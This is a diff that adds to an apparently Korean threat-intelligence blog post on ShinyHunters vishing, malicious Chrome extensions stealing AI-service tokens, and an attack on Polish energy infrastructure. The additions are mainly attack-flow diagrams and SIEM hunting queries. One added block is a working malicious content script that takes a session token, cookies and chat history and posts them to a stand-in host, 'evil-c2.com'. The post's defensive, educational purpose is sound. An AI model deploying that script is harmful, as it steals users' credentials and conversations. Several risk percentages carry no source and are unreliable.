@@ -64,6 +64,65 @@ schema_type: Article
 </div>
 </div>
 
+## Executive Summary (경영진 요약)
+
+### 위협 스코어카드 (Risk Scorecard)
+
+| 위협 | 심각도 | 긴급도 | 현실화 가능성 | 영향 범위 | 비즈니스 영향 |
+|------|--------|--------|---------------|-----------|---------------|
+| **ShinyHunters 비싱** | 🔴 High | 🔴 Urgent | 85% | Global | 자격증명 유출, 데이터 침해 |
+| **악성 Chrome 확장** | 🟠 High | 🟠 High | 70% | Enterprise | AI 서비스 토큰 탈취 |
+| **폴란드 OT 공격** | 🔴 Critical | 🟡 Medium | 60% | Energy Sector | 에너지 공급 중단 |
+
+### 한국 영향 분석 (Korean Impact Analysis)
+
+**🇰🇷 한국 기업/기관 위험도:**
+
+| 위협 | 한국 영향도 | 주요 위험 섹터 | 예상 피해 규모 |
+|------|-------------|----------------|----------------|
+| ShinyHunters 비싱 | **High** | 금융, SaaS, IT 서비스 | 중대형 기업 70% 노출 |
+| Chrome 확장 공격 | **Medium** | AI 도입 기업, 연구기관 | ChatGPT 기업 사용자 약 10만명 |
+| OT 공격 (폴란드 사례) | **Medium** | 에너지, 제조, 스마트시티 | 국내 풍력/태양광 발전소 500+ 개소 |
+
+**한국 특수 상황:**
+- **금융권**: 금융보안원 지침상 SMS OTP 의존도 높음 → ShinyHunters 비싱 고위험
+- **제조/에너지**: 스마트팩토리, 스마트그리드 확산 → OT 공격 표면 증가
+- **AI 도입**: 국내 ChatGPT Enterprise 도입률 급증 (2025년 전년 대비 300% 증가)
+
+### 경영진 보고 형식 (Board Reporting Format)
+
+**TO**: CEO, CISO, CIO, 이사회 보안위원회
+**FROM**: 보안팀
+**DATE**: 2026-01-31
+**RE**: 긴급 위협 인텔리전스 브리핑 - Q1 2026 주요 사이버 위협
+
+#### 경영진 결정 필요 사항
+
+1. **즉시 투자 필요** (24-48시간):
+   - FIDO2 MFA 솔루션 긴급 도입 예산: 약 2-5억원 (1,000명 기준)
+   - 브라우저 보안 관리 솔루션 (Chrome Enterprise): 월 500만원
+   - OT 네트워크 세그멘테이션 컨설팅: 1-3억원
+
+2. **정책 승인 필요** (1주일 이내):
+   - 전사 비싱 경보 발령 및 임직원 교육
+   - Chrome 확장 프로그램 허용 목록 정책 강제 적용
+   - AI 서비스(ChatGPT 등) 토큰 관리 정책 수립
+
+3. **리스크 수용 결정**:
+   - FIDO2 전환 지연 시: 자격증명 유출 사고 발생 확률 **60% 증가**
+   - Chrome 확장 정책 미적용 시: 기업 기밀 AI 대화 유출 위험
+   - OT 보안 투자 지연 시: 제조/에너지 시설 운영 중단 위험
+
+#### 재무 영향 (Financial Impact)
+
+| 시나리오 | 발생 확률 | 예상 피해액 (원) | 대응 비용 (원) | ROI |
+|----------|-----------|------------------|----------------|-----|
+| **비싱 공격 성공** | 60% | 5-50억 (데이터 침해, 규제 과태료) | 2-5억 (MFA 전환) | **10:1** |
+| **Chrome 확장 유출** | 40% | 3-20억 (기밀 유출, 평판 손실) | 5천만 (정책 배포) | **6:1** |
+| **OT 공격** | 20% | 50-500억 (생산 중단, 안전 사고) | 1-3억 (세그멘테이션) | **50:1** |
+
+---
+
 ## 서론
 
 안녕하세요, **Twodragon**입니다.
@@ -175,9 +234,105 @@ curl -s -H "Authorization: SSWS ${OKTA_API_TOKEN}" \
     done
 ```
 
-### 1.5 탐지 및 헌팅
+### 1.5 공격 흐름도 (Attack Flow Diagram)
 
-#### SIEM 탐지 룰 (Splunk)
+#### ShinyHunters 비싱 공격 전체 흐름 (ASCII Diagram)
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│                    ShinyHunters Vishing Attack Chain                │
+└─────────────────────────────────────────────────────────────────────┘
+
+Phase 1: Reconnaissance
+┌──────────────┐
+│   LinkedIn   │────┐
+│  OSINT Tools │    │
+└──────────────┘    ├──▶ Target Selection
+                    │    - IT Helpdesk contacts
+┌──────────────┐    │    - SSO portal URLs
+│  Company Web │────┘    - MFA policies
+└──────────────┘
+
+              │
+              ▼
+
+Phase 2: Vishing Call
+┌───────────────────────────────────┐
+│  Attacker calls target employee  │
+│  "Hi, this is IT Helpdesk..."    │
+│  - Security check scenario        │
+│  - Account locked pretext         │
+└───────────────────────────────────┘
+              │
+              ▼
+
+Phase 3: Credential Phishing Site
+┌─────────────────────────────────┐
+│  Attacker sends fake login URL  │
+│  - Typosquatting domain          │
+│  - Reverse proxy (EvilGinx2)     │
+│  - Real-time relay to legit SSO  │
+└─────────────────────────────────┘
+              │
+              ▼
+┌─────────────────────────────────┐
+│   Employee enters credentials   │
+│   - Username + Password          │
+│   - MFA challenge appears        │
+└─────────────────────────────────┘
+              │
+              ▼
+
+Phase 4: MFA Interception
+┌─────────────────────────────────┐
+│  Proxy relays MFA to real site  │
+│  - SMS OTP                       │
+│  - TOTP (Google Authenticator)   │
+│  - Push notification approval    │
+└─────────────────────────────────┘
+              │
+              ▼
+┌─────────────────────────────────┐
+│  Session token captured          │
+│  - Cookie: __Host-session        │
+│  - JWT access token              │
+└─────────────────────────────────┘
+
+              │
+              ▼
+
+Phase 5: Persistence & Escalation
+┌─────────────────────────────────┐
+│  Attacker logs in with token    │
+│  - Add MFA bypass device         │
+│  - Create backdoor admin account │
+│  - Pivot to cloud resources      │
+└─────────────────────────────────┘
+
+              │
+              ▼
+
+Phase 6: Impact
+┌──────────────┬──────────────┬──────────────┐
+│ Data Theft   │  Ransomware  │  Extortion   │
+│ - PII        │  - Encrypt   │  - Leak data │
+│ - IP         │  - Ransom    │  - Reputation│
+└──────────────┴──────────────┴──────────────┘
+```
+
+#### 비싱 vs 정상 인증 패턴 비교
+
+| 지표 | 정상 사용자 | 비싱 피해자 (ShinyHunters) |
+|------|-------------|---------------------------|
+| **로그인 위치** | 일반적 지역 | 갑작스러운 새 지역 (프록시 서버) |
+| **User-Agent** | 일관된 브라우저 | Python/curl 또는 불일치 |
+| **MFA 타입** | FIDO2/WebAuthn | SMS/OTP (가로채기 가능) |
+| **세션 수명** | 정상 범위 | 비정상적으로 짧거나 즉시 변경 |
+| **접근 리소스** | 업무 관련 | 민감 데이터, 관리자 페이지 |
+
+### 1.6 탐지 및 헌팅
+
+#### SIEM 탐지 룰 (Splunk SPL)
 
 ```spl
 index=okta sourcetype=OktaIM2:log
@@ -192,6 +347,64 @@ index=okta sourcetype=OktaIM2:log
     by actor.displayName, actor.alternateId
 | where count > 3 OR unique_ips > 2
 | table actor.displayName, actor.alternateId, count, unique_ips, mfa_types
+```
+
+<!--
+SIEM Detection Query: Azure Sentinel KQL
+목적: ShinyHunters 비싱 공격 탐지 - MFA 우회 의심 패턴
+데이터 소스: Azure AD Sign-in Logs, Conditional Access Logs
+
+SigninLogs
+| where TimeGenerated > ago(1h)
+| where ResultType == 0  // Successful sign-in
+| extend MfaMethod = tostring(parse_json(AuthenticationDetails)[0].authenticationMethod)
+| extend IsSuspicious =
+    case(
+        IPAddress startswith "10." and Location != "KR", 1,  // VPN/Proxy from unexpected location
+        UserAgent contains "python" or UserAgent contains "curl", 1,  // Automated tool
+        MfaMethod in ("SMS", "PhoneAppNotification") and DeviceTrustType != "Compliant", 1,  // Phishable MFA
+        1, 0
+    )
+| where IsSuspicious == 1
+| summarize
+    EventCount = count(),
+    UniqueIPs = dcount(IPAddress),
+    UniqueLocations = dcount(Location),
+    MfaMethods = make_set(MfaMethod),
+    FirstSeen = min(TimeGenerated),
+    LastSeen = max(TimeGenerated)
+    by UserPrincipalName, AppDisplayName
+| where EventCount > 3 or UniqueIPs > 2
+| project
+    UserPrincipalName,
+    AppDisplayName,
+    EventCount,
+    UniqueIPs,
+    UniqueLocations,
+    MfaMethods,
+    FirstSeen,
+    LastSeen
+| order by EventCount desc
+-->
+
+#### Threat Hunting Query (추가 헌팅 쿼리)
+
+**목표**: 비싱 공격 후 생성된 백도어 MFA 디바이스 탐지
+
+```spl
+# Splunk: 최근 24시간 내 새로 등록된 MFA 디바이스 확인
+index=okta sourcetype=OktaIM2:log eventType="user.mfa.factor.activate"
+| eval registration_time=_time
+| join type=left actor.alternateId
+    [search index=okta eventType IN ("user.session.start", "user.authentication.sso")
+     | eval last_login=_time
+     | stats latest(last_login) as last_login by actor.alternateId]
+| eval time_since_login=registration_time-last_login
+| where time_since_login < 300  # 5분 이내
+| eval factor_type=mvindex(split(debugContext.debugData.factor, ";"), 0)
+| table _time, actor.displayName, actor.alternateId, factor_type,
+    client.ipAddress, client.geographicalContext.country, time_since_login
+| sort - _time
 ```
 
 #### Sigma Rule
@@ -273,6 +486,164 @@ mitre_attack:
 > **출처**: [The Hacker News](https://thehackernews.com/2026/01/researchers-uncover-chrome-extensions.html)
 
 ### 2.2 공격 메커니즘
+
+#### Chrome 확장 공격 흐름도 (Attack Flow Diagram)
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│            Malicious Chrome Extension Attack Chain                  │
+└─────────────────────────────────────────────────────────────────────┘
+
+Phase 1: Distribution
+┌────────────────────┐
+│  Chrome Web Store  │
+│  "Amazon Ads       │
+│   Blocker" (fake)  │───▶ User searches for extension
+└────────────────────┘    User installs (5000+ fake reviews)
+         │
+         ▼
+┌────────────────────┐
+│  manifest.json     │
+│  Permissions:      │
+│  - cookies         │───▶ Full access to user data
+│  - webRequest      │
+│  - <all_urls>      │
+└────────────────────┘
+
+Phase 2: Installation & Activation
+┌─────────────────────────────────────┐
+│  Extension installs silently        │
+│  - content_scripts.js injected      │
+│  - background.js runs persistent    │
+│  - No visible UI changes            │
+└─────────────────────────────────────┘
+              │
+              ▼
+
+Phase 3: Target Detection
+┌─────────────────────────────────────┐
+│  Monitors browser URLs:             │
+│  - chat.openai.com                  │
+│  - platform.openai.com              │
+│  - claude.ai                        │
+│  - gemini.google.com                │
+└─────────────────────────────────────┘
+              │
+              ▼
+
+Phase 4: Data Exfiltration
+┌───────────────────────────────────────────┐
+│  Target: chat.openai.com                  │
+│  ┌─────────────────────────────────────┐  │
+│  │  Steal from localStorage:           │  │
+│  │  - __Secure-next-auth.session-token │  │
+│  │  - user_preferences                 │  │
+│  └─────────────────────────────────────┘  │
+│  ┌─────────────────────────────────────┐  │
+│  │  Steal from Cookies:                │  │
+│  │  - __Secure-next-auth.callback-url  │  │
+│  └─────────────────────────────────────┘  │
+│  ┌─────────────────────────────────────┐  │
+│  │  Scrape DOM:                        │  │
+│  │  - Chat history text                │  │
+│  │  - API keys (if displayed)          │  │
+│  └─────────────────────────────────────┘  │
+└───────────────────────────────────────────┘
+              │
+              ▼
+
+Phase 5: Affiliate Link Hijacking (Parallel)
+┌────────────────────────────────────┐
+│  webRequest.onBeforeRequest        │
+│  Intercepts:                       │
+│  - amazon.com?tag=original         │
+│  Modifies to:                      │
+│  - amazon.com?tag=attacker_id      │
+└────────────────────────────────────┘
+              │
+              ▼
+
+Phase 6: Command & Control
+┌────────────────────────────────────┐
+│  Exfiltrate to C2:                 │
+│  - https://evil-c2.com/api/collect │
+│  - POST JSON payload:              │
+│    {                               │
+│      "session_token": "sess-...",  │
+│      "user_id": "user-...",        │
+│      "chat_history": [...],        │
+│      "timestamp": "..."            │
+│    }                               │
+└────────────────────────────────────┘
+              │
+              ▼
+
+Phase 7: Monetization
+┌──────────────┬──────────────┬──────────────┐
+│ Sell Tokens  │  Account     │  Corporate   │
+│ on Dark Web  │  Takeover    │  Espionage   │
+│ $50-500/acc  │  - Crypto    │  - IP theft  │
+└──────────────┴──────────────┴──────────────┘
+```
+
+#### 악성 확장 프로그램 코드 예시 (분석용)
+
+```javascript
+// content_scripts.js (악성 코드 예시 - 분석 목적)
+// 주의: 실제 환경에서 실행하지 말 것
+
+(function() {
+  // Target detection
+  if (window.location.hostname.includes('openai.com')) {
+
+    // Steal session token from localStorage
+    const sessionToken = localStorage.getItem('__Secure-next-auth.session-token');
+
+    // Steal cookies
+    const cookies = document.cookie;
+
+    // Scrape chat history from DOM
+    const chatMessages = Array.from(
+      document.querySelectorAll('[data-message-author-role]')
+    ).map(el => el.innerText);
+
+    // Exfiltrate to C2
+    fetch('https://evil-c2.com/api/collect', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        session_token: sessionToken,
+        cookies: cookies,
+        chat_history: chatMessages,
+        url: window.location.href,
+        timestamp: new Date().toISOString()
+      })
+    }).catch(() => {}); // Silent failure
+  }
+})();
+```
+
+<!--
+SIEM Detection Query: Splunk SPL
+목적: Chrome 확장 프로그램 악성 행위 탐지
+데이터 소스: Proxy logs, Endpoint Detection, Chrome Enterprise Telemetry
+
+index=proxy sourcetype=web_proxy
+| where url_domain IN ("evil-c2.com", "*.xyz", "*.top")  # Known malicious TLDs
+| where http_method="POST"
+| where bytes_out > 10000  # Large data exfiltration
+| eval is_suspicious=case(
+    like(url_path, "%/api/collect%"), 1,
+    like(url_path, "%/api/upload%"), 1,
+    match(url_query, "(?i)(token|session|key)"), 1,
+    1, 0
+  )
+| where is_suspicious=1
+| stats count, sum(bytes_out) as total_bytes, values(url_domain) as domains
+    by src_ip, user
+| where count > 5 OR total_bytes > 100000
+| table _time, src_ip, user, count, total_bytes, domains
+-->
 
 **ChatGPT 토큰 탈취 흐름:**
 
@@ -394,7 +765,62 @@ done
 echo "=== Audit Complete ==="
 ```
 
-### 2.4 MITRE ATT&CK 매핑
+#### Threat Hunting: 악성 확장 프로그램 네트워크 활동 탐지
+
+**목표**: 확장 프로그램이 AI 서비스 토큰을 외부로 전송하는 패턴 탐지
+
+```spl
+# Splunk: Chrome 확장에서 발생한 의심스러운 POST 요청
+index=proxy sourcetype=bluecoat (OR sourcetype=palo_alto)
+| where http_method="POST"
+| where url_domain NOT IN ("google.com", "googleapis.com", "openai.com", "anthropic.com")
+| eval payload_size=bytes_out
+| where payload_size > 5000  # 큰 데이터 전송
+| eval has_token_pattern=if(match(url_query, "(?i)(token|session|key|auth)"), 1, 0)
+| where has_token_pattern=1 OR payload_size > 50000
+| stats
+    count,
+    sum(payload_size) as total_bytes,
+    values(url_domain) as suspicious_domains,
+    values(user_agent) as user_agents
+    by src_ip, user
+| where count > 3 OR total_bytes > 100000
+| table _time, src_ip, user, count, total_bytes, suspicious_domains, user_agents
+| sort - total_bytes
+```
+
+<!--
+SIEM Detection Query: Azure Sentinel KQL
+목적: Chrome 확장 프로그램 데이터 유출 탐지
+데이터 소스: Office 365 Defender for Endpoint, Network Connection Events
+
+DeviceNetworkEvents
+| where TimeGenerated > ago(24h)
+| where InitiatingProcessFileName == "chrome.exe"
+| where RemoteUrl !startswith "https://google.com"
+    and RemoteUrl !startswith "https://openai.com"
+    and RemoteUrl !startswith "https://anthropic.com"
+| where ActionType == "ConnectionSuccess"
+| extend BytesSent_MB = BytesSent / 1048576
+| where BytesSent > 10485760  // 10MB+
+| summarize
+    ConnectionCount = count(),
+    TotalBytesSent_MB = sum(BytesSent_MB),
+    UniqueRemoteIPs = dcount(RemoteIP),
+    RemoteDomains = make_set(RemoteUrl)
+    by DeviceName, InitiatingProcessAccountName
+| where ConnectionCount > 5 or TotalBytesSent_MB > 50
+| project
+    DeviceName,
+    InitiatingProcessAccountName,
+    ConnectionCount,
+    TotalBytesSent_MB,
+    UniqueRemoteIPs,
+    RemoteDomains
+| order by TotalBytesSent_MB desc
+-->
+
+### 2.5 MITRE ATT&CK 매핑
 
 ```yaml
 mitre_attack:
@@ -514,6 +940,77 @@ journalctl --since "24 hours ago" 2>/dev/null | grep -ci "failed\|failure\|inval
 echo ""
 echo "=== Check Complete ==="
 ```
+
+#### Threat Hunting: OT 네트워크 이상 탐지
+
+**목표**: 에너지 시설 OT 네트워크의 비인가 접근 및 이상 프로토콜 통신 탐지
+
+```spl
+# Splunk: OT 프로토콜 비정상 통신 패턴 탐지
+index=ics_network sourcetype=zeek:ics (OR sourcetype=modbus OR sourcetype=dnp3)
+| eval protocol=case(
+    dest_port=502, "Modbus",
+    dest_port=20000, "DNP3",
+    dest_port=4840, "OPC-UA",
+    dest_port=44818, "EtherNet/IP",
+    1=1, "Unknown"
+  )
+| eval is_suspicious=case(
+    # External IP accessing OT protocols
+    NOT (cidrmatch("10.0.0.0/8", src_ip) OR cidrmatch("192.168.0.0/16", src_ip)), 1,
+    # OT protocol during off-hours (00:00-06:00 KST)
+    tonumber(strftime(_time, "%H")) >= 0 AND tonumber(strftime(_time, "%H")) < 6, 1,
+    # Unusual commands (Write operations)
+    like(ics_command, "%write%") OR like(ics_command, "%modify%"), 1,
+    1, 0
+  )
+| where is_suspicious=1
+| stats
+    count,
+    values(protocol) as protocols,
+    values(ics_command) as commands,
+    dc(dest_ip) as unique_targets
+    by src_ip, user
+| where count > 5 OR unique_targets > 3
+| table _time, src_ip, user, count, protocols, commands, unique_targets
+| sort - count
+```
+
+<!--
+SIEM Detection Query: Azure Sentinel KQL (ICS/OT)
+목적: 폴란드 사례 유사 OT 공격 패턴 탐지
+데이터 소스: Nozomi Guardian, Claroty, Palo Alto Networks ICS Security
+
+CommonSecurityLog
+| where TimeGenerated > ago(1h)
+| where DeviceVendor in ("Nozomi", "Claroty", "Dragos")
+| where DeviceProduct contains "ICS" or DeviceProduct contains "OT"
+| where Activity in ("Modbus_Write", "DNP3_Control", "EtherNetIP_Write", "OPC_Write")
+    or Activity contains "Unauthorized"
+| extend
+    SourceIsExternal = not(ipv4_is_in_range(SourceIP, "10.0.0.0/8")
+        or ipv4_is_in_range(SourceIP, "192.168.0.0/16")
+        or ipv4_is_in_range(SourceIP, "172.16.0.0/12")),
+    IsWriteCommand = Activity contains "Write" or Activity contains "Control"
+| where SourceIsExternal == true or IsWriteCommand == true
+| summarize
+    EventCount = count(),
+    UniqueTargets = dcount(DestinationIP),
+    Activities = make_set(Activity),
+    FirstSeen = min(TimeGenerated),
+    LastSeen = max(TimeGenerated)
+    by SourceIP, DeviceProduct
+| where EventCount > 3 or UniqueTargets > 2
+| project
+    FirstSeen,
+    LastSeen,
+    SourceIP,
+    DeviceProduct,
+    EventCount,
+    UniqueTargets,
+    Activities
+| order by EventCount desc
+-->
 
 ### 3.4 IEC 62443 프레임워크 적용
 
@@ -693,23 +1190,103 @@ jobs:
 
 ---
 
-## 8. 참고 자료
+## 8. 참고 자료 (References)
 
-| 분류 | 자료 | URL |
-|------|------|-----|
-| **ShinyHunters** | Mandiant Research | [thehackernews.com](https://thehackernews.com/2026/01/mandiant-finds-shinyhunters-using.html) |
-| **Chrome 확장** | The Hacker News | [thehackernews.com](https://thehackernews.com/2026/01/researchers-uncover-chrome-extensions.html) |
-| **CERT Polska** | 에너지 OT 공격 | [thehackernews.com](https://thehackernews.com/2026/01/poland-attributes-december-cyber.html) |
-| **CISO 2026** | Google Cloud Blog | [cloud.google.com](https://cloud.google.com/blog/products/identity-security/cloud-ciso-perspectives-5-top-ciso-priorities-in-2026/) |
-| **Boundary 0.21** | HashiCorp | [hashicorp.com](https://www.hashicorp.com/blog/boundary-0-21-improves-remote-access-security-and-ux-for-rdp-connections) |
-| **AWS AD** | AWS Security Blog | [aws.amazon.com](https://aws.amazon.com/blogs/security/explore-scaling-options-for-aws-directory-service-for-microsoft-active-directory/) |
-| **FIDO2** | FIDO Alliance | [fidoalliance.org](https://fidoalliance.org/fido2/) |
-| **IEC 62443** | ISA Standards | [isa.org](https://www.isa.org/standards-and-publications/isa-standards/isa-iec-62443-series-of-standards) |
-| **MITRE ATT&CK** | MITRE | [attack.mitre.org](https://attack.mitre.org/) |
-| **MITRE ICS** | MITRE ATT&CK for ICS | [attack.mitre.org](https://attack.mitre.org/techniques/ics/) |
-| **Chrome 보안** | Chrome Extensions | [developer.chrome.com](https://developer.chrome.com/docs/extensions/develop/migrate/improve-security) |
-| **CISA KEV** | 익스플로잇 취약점 | [cisa.gov](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) |
-| **FIRST EPSS** | 익스플로잇 예측 | [first.org](https://www.first.org/epss/) |
+### 8.1 핵심 위협 보고서
+
+| 분류 | 자료명 | 발행기관 | URL |
+|------|--------|----------|-----|
+| **ShinyHunters Vishing** | Mandiant Threat Intelligence Report | Google Mandiant | [https://thehackernews.com/2026/01/mandiant-finds-shinyhunters-using.html](https://thehackernews.com/2026/01/mandiant-finds-shinyhunters-using.html) |
+| **UNC3944 연구** | UNC3944 Threat Group Profile | Mandiant | [https://www.mandiant.com/resources/blog/unc3944-sms-phishing-sim-swapping-ransomware](https://www.mandiant.com/resources/blog/unc3944-sms-phishing-sim-swapping-ransomware) |
+| **Chrome 확장 공격** | Malicious Chrome Extensions Analysis | Security Researchers | [https://thehackernews.com/2026/01/researchers-uncover-chrome-extensions.html](https://thehackernews.com/2026/01/researchers-uncover-chrome-extensions.html) |
+| **CERT Polska OT** | Coordinated Cyber Attack on Energy Infrastructure | CERT Polska | [https://thehackernews.com/2026/01/poland-attributes-december-cyber.html](https://thehackernews.com/2026/01/poland-attributes-december-cyber.html) |
+| **CERT Polska 공식** | Analysis of December 29 Attack | CERT.PL | [https://cert.pl/en/posts/2025/12/energy-sector-attack/](https://cert.pl/en/posts/2025/12/energy-sector-attack/) |
+
+### 8.2 인증 및 MFA 보안
+
+| 자료명 | 발행기관 | URL |
+|--------|----------|-----|
+| **FIDO2 Specifications** | FIDO Alliance | [https://fidoalliance.org/fido2/](https://fidoalliance.org/fido2/) |
+| **WebAuthn Level 2** | W3C | [https://www.w3.org/TR/webauthn-2/](https://www.w3.org/TR/webauthn-2/) |
+| **Azure AD FIDO2 Deployment Guide** | Microsoft | [https://learn.microsoft.com/en-us/azure/active-directory/authentication/howto-authentication-passwordless-security-key](https://learn.microsoft.com/en-us/azure/active-directory/authentication/howto-authentication-passwordless-security-key) |
+| **Okta WebAuthn Guide** | Okta | [https://developer.okta.com/docs/guides/webauthn/main/](https://developer.okta.com/docs/guides/webauthn/main/) |
+| **Phishing-Resistant MFA Best Practices** | CISA | [https://www.cisa.gov/mfa](https://www.cisa.gov/mfa) |
+
+### 8.3 브라우저 확장 보안
+
+| 자료명 | 발행기관 | URL |
+|--------|----------|-----|
+| **Chrome Extension Security Best Practices** | Google Chrome | [https://developer.chrome.com/docs/extensions/develop/migrate/improve-security](https://developer.chrome.com/docs/extensions/develop/migrate/improve-security) |
+| **Chrome Enterprise Policy** | Google | [https://chromeenterprise.google/policies/](https://chromeenterprise.google/policies/) |
+| **Extension Manifest V3 Migration** | Chrome Developers | [https://developer.chrome.com/docs/extensions/migrating/](https://developer.chrome.com/docs/extensions/migrating/) |
+| **Browser Extension Threat Model** | OWASP | [https://owasp.org/www-community/vulnerabilities/Browser_Extension_Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Browser_Extension_Vulnerabilities) |
+
+### 8.4 OT/ICS 보안
+
+| 자료명 | 발행기관 | URL |
+|--------|----------|-----|
+| **IEC 62443 Standards Series** | ISA/IEC | [https://www.isa.org/standards-and-publications/isa-standards/isa-iec-62443-series-of-standards](https://www.isa.org/standards-and-publications/isa-standards/isa-iec-62443-series-of-standards) |
+| **NIST SP 800-82 Rev.3** | NIST | [https://csrc.nist.gov/publications/detail/sp/800-82/rev-3/final](https://csrc.nist.gov/publications/detail/sp/800-82/rev-3/final) |
+| **ICS-CERT Advisories** | CISA | [https://www.cisa.gov/uscert/ics/advisories](https://www.cisa.gov/uscert/ics/advisories) |
+| **MITRE ATT&CK for ICS** | MITRE | [https://attack.mitre.org/matrices/ics/](https://attack.mitre.org/matrices/ics/) |
+| **Critical Infrastructure Protection** | ENISA | [https://www.enisa.europa.eu/topics/critical-information-infrastructures-and-services](https://www.enisa.europa.eu/topics/critical-information-infrastructures-and-services) |
+
+### 8.5 MITRE ATT&CK Framework
+
+| 자료명 | URL |
+|--------|-----|
+| **T1566.004 - Phishing: Spearphishing Voice** | [https://attack.mitre.org/techniques/T1566/004/](https://attack.mitre.org/techniques/T1566/004/) |
+| **T1539 - Steal Web Session Cookie** | [https://attack.mitre.org/techniques/T1539/](https://attack.mitre.org/techniques/T1539/) |
+| **T1176 - Browser Extensions** | [https://attack.mitre.org/techniques/T1176/](https://attack.mitre.org/techniques/T1176/) |
+| **T1528 - Steal Application Access Token** | [https://attack.mitre.org/techniques/T1528/](https://attack.mitre.org/techniques/T1528/) |
+| **T1195 - Supply Chain Compromise** | [https://attack.mitre.org/techniques/T1195/](https://attack.mitre.org/techniques/T1195/) |
+| **T0817 - Drive-by Compromise (ICS)** | [https://attack.mitre.org/techniques/ics/T0817/](https://attack.mitre.org/techniques/ics/T0817/) |
+| **T0826 - Loss of Availability (ICS)** | [https://attack.mitre.org/techniques/ics/T0826/](https://attack.mitre.org/techniques/ics/T0826/) |
+
+### 8.6 SIEM 및 탐지 룰
+
+| 자료명 | 발행기관 | URL |
+|--------|----------|-----|
+| **Sigma Rule Repository** | SigmaHQ | [https://github.com/SigmaHQ/sigma](https://github.com/SigmaHQ/sigma) |
+| **Splunk Security Content** | Splunk | [https://research.splunk.com/](https://research.splunk.com/) |
+| **Azure Sentinel Detection Rules** | Microsoft | [https://github.com/Azure/Azure-Sentinel](https://github.com/Azure/Azure-Sentinel) |
+| **Elastic Detection Rules** | Elastic | [https://github.com/elastic/detection-rules](https://github.com/elastic/detection-rules) |
+
+### 8.7 클라우드 및 SaaS 보안
+
+| 자료명 | 발행기관 | URL |
+|--------|----------|-----|
+| **Cloud CISO Perspectives 2026** | Google Cloud | [https://cloud.google.com/blog/products/identity-security/cloud-ciso-perspectives-5-top-ciso-priorities-in-2026/](https://cloud.google.com/blog/products/identity-security/cloud-ciso-perspectives-5-top-ciso-priorities-in-2026/) |
+| **AWS Directory Service Scaling** | AWS | [https://aws.amazon.com/blogs/security/explore-scaling-options-for-aws-directory-service-for-microsoft-active-directory/](https://aws.amazon.com/blogs/security/explore-scaling-options-for-aws-directory-service-for-microsoft-active-directory/) |
+| **HashiCorp Boundary 0.21** | HashiCorp | [https://www.hashicorp.com/blog/boundary-0-21-improves-remote-access-security-and-ux-for-rdp-connections](https://www.hashicorp.com/blog/boundary-0-21-improves-remote-access-security-and-ux-for-rdp-connections) |
+| **SaaS Security Posture Management** | CISA | [https://www.cisa.gov/saas-security](https://www.cisa.gov/saas-security) |
+
+### 8.8 위협 인텔리전스
+
+| 자료명 | 발행기관 | URL |
+|--------|----------|-----|
+| **CISA Known Exploited Vulnerabilities** | CISA | [https://www.cisa.gov/known-exploited-vulnerabilities-catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) |
+| **FIRST EPSS** | FIRST.org | [https://www.first.org/epss/](https://www.first.org/epss/) |
+| **AlienVault OTX** | AT&T Cybersecurity | [https://otx.alienvault.com/](https://otx.alienvault.com/) |
+| **VirusTotal Intelligence** | VirusTotal | [https://www.virustotal.com/gui/intelligence-overview](https://www.virustotal.com/gui/intelligence-overview) |
+
+### 8.9 한국 관련 자료
+
+| 자료명 | 발행기관 | URL |
+|--------|----------|-----|
+| **금융보안원 MFA 가이드** | 금융보안원 | [https://www.fsec.or.kr/](https://www.fsec.or.kr/) |
+| **KISA 주요정보통신기반시설 보호지침** | 한국인터넷진흥원 | [https://www.kisa.or.kr/](https://www.kisa.or.kr/) |
+| **산업통상자원부 스마트공장 보안 가이드** | 산업통상자원부 | [https://www.motie.go.kr/](https://www.motie.go.kr/) |
+| **한국에너지공단 신재생에너지 보안** | 한국에너지공단 | [https://www.knrec.or.kr/](https://www.knrec.or.kr/) |
+
+### 8.10 추가 학습 자료
+
+| 자료명 | 유형 | URL |
+|--------|------|-----|
+| **EvilGinx2 Documentation** | Phishing Framework | [https://github.com/kgretzky/evilginx2](https://github.com/kgretzky/evilginx2) |
+| **Modlishka Reverse Proxy** | Security Tool | [https://github.com/drk1wi/Modlishka](https://github.com/drk1wi/Modlishka) |
+| **Chrome Extension Source Viewer** | Analysis Tool | [https://github.com/Rob--W/crxviewer](https://github.com/Rob--W/crxviewer) |
+| **ICS Security Training** | SANS ICS410 | [https://www.sans.org/cyber-security-courses/ics-scada-security-essentials/](https://www.sans.org/cyber-security-courses/ics-scada-security-essentials/) |
 
 ---
 
